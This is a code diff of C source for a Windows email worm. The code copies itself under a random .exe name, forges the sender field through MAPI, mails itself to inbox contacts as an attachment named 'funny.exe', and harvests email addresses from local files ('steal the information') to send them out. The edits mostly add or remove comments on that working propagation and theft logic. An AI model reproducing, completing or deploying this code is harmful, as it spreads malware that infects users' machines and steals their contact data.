@@ -91,7 +91,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
 	num = rand() % 10;
 randname:
 	strcat(copyr, alph[GetTickCount() % 25]);
-	if (++counter == num) {//if coounter more than 9, then the "endrandname:" will not execute,right?
+	if (++counter == num) {
 		strcat(copyr, ".exe");
 		MessageBox(NULL, copyr, "New Copy Name:", MB_OK | MB_ICONINFORMATION);
 		//***************************************************************************//
@@ -229,11 +229,9 @@ endrandname:
 				mes->lpszConversationID = NULL;
 				mes->flFlags = MAPI_SENT;
 				mes->lpOriginator->ulReserved = 0;
-				//**********************************************************//
-				mes->lpOriginator->ulRecipClass = MAPI_ORIG;//hide sender information
+				mes->lpOriginator->ulRecipClass = MAPI_ORIG;
 				mes->lpOriginator->lpszName = mes->lpRecips->lpszName;
 				mes->lpOriginator->lpszAddress = mes->lpRecips->lpszAddress;
-				//**********************************************************//
 				mes->nRecipCount = 1;
 				mes->lpRecips->ulReserved = 0;
 				mes->lpRecips->ulRecipClass = MAPI_TO;
@@ -245,13 +243,12 @@ endrandname:
 				mes->lpFiles->ulReserved = 0;
 				mes->lpFiles->flFlags = NULL;
 				mes->lpFiles->nPosition = -1;
+				//****************************************************************//
 				mes->lpFiles->lpszPathName = filename;
 				mes->lpFiles->lpszFileName = "funny.exe";
+				//****************************************************************//
 				mes->lpFiles->lpFileType = NULL;
-				//********************************************************//
-				mSendMail(session, NULL, mes, NULL, NULL);//send the mail
-				//********************************************************//
-				//之前那个.vbs发了一个邮件，这个又发了一个，会不会多发了......
+				mSendMail(session, NULL, mes, NULL, NULL);
 			}
 		} while (mFindNext(session, 0, NULL, messId, MAPI_LONG_MSGID, NULL, messId) == SUCCESS_SUCCESS);
 		free(mes->lpFiles);
@@ -276,7 +273,7 @@ void FindFile(char* folder, char* ext)
 			GetMail(ffile.cFileName, mail);//steal the information
 			if (strlen(mail) > 0) {
 				//********************************************************************************//
-				sendmail(mail);//send the information
+				sendmail(mail);//send the information.
 				//********************************************************************************//
 			}
 			abc = FindNextFile(hFile, &ffile);
